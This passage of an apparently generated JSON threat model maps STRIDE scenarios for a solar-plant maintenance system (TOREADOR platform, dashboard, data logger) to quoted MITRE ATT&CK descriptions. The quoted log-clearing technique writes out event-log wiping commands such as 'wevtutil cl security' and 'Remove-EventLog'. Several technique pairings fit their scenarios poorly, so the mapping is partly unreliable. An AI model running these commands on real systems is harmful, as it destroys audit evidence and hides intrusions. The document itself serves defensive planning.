                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized user accesses the Dashboard by impersonating a legitimate employee.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no multi-factor authentication implemented.",
                    "Role": "System Administrator",
                    "Condition": "Authentication is weakened."
                },
                {
                    "Assumption": "Credentials are shared or reused across multiple platforms.",
                    "Role": "Employees",
                    "Condition": "Poor credential management."
                },
                {
                    "Assumption": "The attacker has obtained login credentials through phishing or other means.",
                    "Role": "Attacker",
                    "Condition": "Credential theft."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "phishing",
                "dashboard access"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Compromise of the Anonymity Agent to inject malicious pre-processed data.",
            "Assumptions": [
                {
                    "Assumption": "The Anonymity Agent has vulnerabilities that can be exploited remotely.",
                    "Role": "System Security",
                    "Condition": "Vulnerabilities present in Anonymity Agent."
                },
                {
                    "Assumption": "The network communication interface is not adequately secured.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of network security."
                },
                {
                    "Assumption": "Insufficient monitoring and logging of Anonymity Agent activities.",
                    "Role": "System Auditor",
                    "Condition": "Lack of adequate monitoring."
                }
            ],
            "Potential Impact": "Corrupting ML model training data, leading to inaccurate predictions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "malicious injection",
                "ML model",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data logger's firmware to alter sensor data before it is transmitted.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can physically access the data logger.",
                    "Role": "Attacker",
                    "Condition": "Physical security is compromised."
                },
                {
                    "Assumption": "Firmware update mechanisms are insecure or lack signing.",
                    "Role": "System Developer",
                    "Condition": "Insecure update mechanism."
                },
                {
                    "Assumption": "Lack of validation for firmware integrity.",
                    "Role": "System Security",
                    "Condition": "No integrity checks on firmware."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential for erroneous maintenance operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "sensor data",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Temporary modification of the central server's stored data by exploiting a vulnerability in the server software.",
            "Assumptions": [
                {
                    "Assumption": "Server software contains a vulnerability that can be exploited remotely.",
                    "Role": "System Security",
                    "Condition": "Unpatched vulnerabilities."
                },
                {
                    "Assumption": "The attacker can interact with the server over the network.",
                    "Role": "Attacker",
                    "Condition": "Network access to server."
                },
                {
                    "Assumption": "Inadequate monitoring and intrusion detection on the server.",
                    "Role": "System Auditor",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Temporary disruption of predictive maintenance and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server",
                "data modification",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Internal malicious actor modifies metadata to impact model training outcomes.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls for metadata management.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "Lack of proper logging for actions performed on metadata.",
                    "Role": "System Auditor",
                    "Condition": "No logging or audit trails."
                },
                {
                    "Assumption": "The insider has sufficient privileges to alter metadata.",
                    "Role": "Insider",
                    "Condition": "Access to modify metadata."
                }
            ],
            "Potential Impact": "Reduced accuracy of predictive models leading to operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "metadata",
                "insider threat",
                "data accuracy"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker claims not to have performed a malicious action due to lack of logging or audit trails.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of user actions in the dashboard and other components.",
                    "Role": "System Auditor",
                    "Condition": "Lack of comprehensive logging."
                },
                {
                    "Assumption": "Absence of secure, immutable log storage.",
                    "Role": "System Security",
                    "Condition": "Logs can be altered or deleted."
                },
                {
                    "Assumption": "Insufficient role-based access controls.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access control policies."
                }
            ],
            "Potential Impact": "Difficulty in attributing malicious actions compromising system integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trails",
                "attribution"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee User denies having accessed sensitive data on the dashboard after a data leak is discovered.",
            "Assumptions": [
                {
                    "Assumption": "Access to the dashboard is not fully logged or lacks detail.",
                    "Role": "System Owner",
                    "Condition": "Incomplete or missing access logs."
                },
                {
                    "Assumption": "Logs are not securely stored or are easy to alter.",
                    "Role": "System Administrator",
                    "Condition": "Insecure log storage."
                },
                {
                    "Assumption": "Role-based access control is not strict enough.",
                    "Role": "System Architect",
                    "Condition": "Weak access control implementation."
                }
            ],
            "Potential Impact": "Compromised ability to identify the source of data leaks.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "dashboard",
                "access control",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Injected malicious data in the TOREADOR platform denies responsibility for data corruption.",
            "Assumptions": [
                {
                    "Assumption": "Changes in the TOREADOR platform are not logged.",
                    "Role": "System Developer",
                    "Condition": "Lack of change logging."
                },
                {
                    "Assumption": "System does not distinguish between legitimate and illegitimate changes.",
                    "Role": "System Security",
                    "Condition": "Weak data validation mechanisms."
                },
                {
                    "Assumption": "No mechanism to revert changes or restore valid data.",
                    "Role": "System Administrator",
                    "Condition": "No version control or backups."
                }
            ],
            "Potential Impact": "Inefficiency in tracing sources of data corruption.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data corruption",
                "TOREADOR platform",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data from sensors is intercepted during transmission to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data is transmitted over an unsecured network.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of encryption."
                },
                {
                    "Assumption": "No use of secure communication channels (e.g., TLS).",
                    "Role": "System Architect",
                    "Condition": "Unsecured communication protocol."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "sensor data",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Metadata related to the power plants is exposed due to insufficient access controls.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is not adequately protected with access controls.",
                    "Role": "System Administrator",
                    "Condition": "Weak access policies."
                },
                {
                    "Assumption": "No encryption applied to metadata at rest.",
                    "Role": "System Security",
                    "Condition": "Unencrypted metadata."
                },
                {
                    "Assumption": "System permits broad access to metadata.",
                    "Role": "System Architect",
                    "Condition": "Inadequate role-based access control."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational and ownership data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "access control",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized dashboard access reveals predictions and operational status of the solar energy grid.",
            "Assumptions": [
                {
                    "Assumption": "Lack of multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Weak authentication mechanisms."
                },
                {
                    "Assumption": "Passwords are exposed or reused across multiple platforms.",
                    "Role": "Employees",
                    "Condition": "Poor password hygiene."
                },
                {
                    "Assumption": "Insufficient monitoring of login attempts.",
                    "Role": "Security Team",
                    "Condition": "Lack of login activity monitoring."
                }
            ],
            "Potential Impact": "Disclosure of sensitive predictive data and operational status.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "dashboard",
                "authentication",
                "operational data"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack targets the Receiver component to disrupt data collection.",
            "Assumptions": [
                {
                    "Assumption": "The network infrastructure lacks protection against DDoS attacks.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of DDoS protection mechanisms."
                },
                {
                    "Assumption": "The Receiver can be overwhelmed by high volumes of traffic.",
                    "Role": "System Architect",
                    "Condition": "Inadequate scalability."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms are in place for the Receiver.",
                    "Role": "System Administrator",
                    "Condition": "Lack of redundancy."
                }
            ],
            "Potential Impact": "Disruption in data flow and predictive maintenance operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "receiver",
                "data flow disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the TOREADOR platform with illegitimate data to obstruct model training and predictions.",
            "Assumptions": [
                {
                    "Assumption": "The platform accepts data from untrusted sources without validation.",
                    "Role": "System Developer",
                    "Condition": "Lack of data validation."
                },
                {
                    "Assumption": "There are no rate limiting mechanisms on data submission.",
                    "Role": "System Architect",
                    "Condition": "No rate limiting."
                },
                {
                    "Assumption": "Inadequate monitoring and alerting for unusual data patterns.",
                    "Role": "System Auditor",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Disruption in predictive model accuracy and performance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data flooding",
                "model training",
                "performance disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infiltrates the Dashboard, making it unresponsive to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks adequate malware detection and mitigation.",
                    "Role": "System Security",
                    "Condition": "Insufficient malware protection."
                },
                {
                    "Assumption": "Users may inadvertently download and execute malware.",
                    "Role": "Users",
                    "Condition": "Lack of user training and awareness."
                },
                {
                    "Assumption": "The dashboard application has vulnerabilities that can be exploited.",
                    "Role": "System Developer",
                    "Condition": "Unpatched application vulnerabilities."
                }
            ],
            "Potential Impact": "Reduced availability of the dashboard, affecting operational insights and decisions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "dashboard",
                "system unavailability"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the cloud platform to gain unauthorized administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The cloud platform has existing vulnerabilities.",
                    "Role": "System Security",
                    "Condition": "Unpatched vulnerabilities."
                },
                {
                    "Assumption": "Lack of robust access controls for administrative functions.",
                    "Role": "System Architect",
                    "Condition": "Weak access control for admins."
                },
                {
                    "Assumption": "Inadequate monitoring of administrative activities.",
                    "Role": "System Auditor",
                    "Condition": "Lack of admin activity monitoring."
                }
            ],
            "Potential Impact": "Complete control over the system, leading to data manipulation and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud platform",
                "unauthorized access",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Hybrid Identity",
